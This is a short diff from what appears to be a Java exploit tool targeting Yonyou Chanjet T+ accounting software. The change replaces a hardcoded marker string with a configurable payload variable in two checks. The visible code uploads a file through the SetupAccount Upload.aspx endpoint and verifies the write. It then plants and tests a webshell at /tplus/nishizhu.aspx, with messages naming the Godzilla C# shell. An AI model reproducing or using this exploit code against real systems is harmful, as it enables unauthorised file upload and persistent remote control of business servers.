@@ -34,7 +34,7 @@ public class yongyou_chajet_upload implements Exploitlnterface {
         Response post = HttpTools.post(url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1", fir_post ,this.headers, "utf-8");
         if(post.getCode() == 200){
             Response response = HttpTools.get(url + "/tplus/SM/SetupAccount/images/" + filename, new HashMap<String, String>(), "utf-8");
-            if(response.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
+            if(response.getText().contains(shell.test_payload)){
                 textArea.appendText("\n 漏洞存在，测试文件写入成功 \n地址为：" + url + "/tplus/SM/SetupAccount/images/" + filename);
                 return true;
             }else {
@@ -69,7 +69,7 @@ public class yongyou_chajet_upload implements Exploitlnterface {
                 textArea.appendText("\n compiled写入成功 连接shell测试");
 
                 Response response_3 = HttpTools.get(url + "/tplus/nishizhu.aspx?preload=1", new HashMap<String, String>(), "utf-8");
-                if(response_3.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
+                if(response_3.getText().contains(shell.test_payload)){
                     textArea.appendText("\n Shell 获取成功 \n地址为：/tplus/nishizhu.aspx?preload=1  哥斯拉 Cshap / cshap_aes_base64");
                     return true;
                 }else {
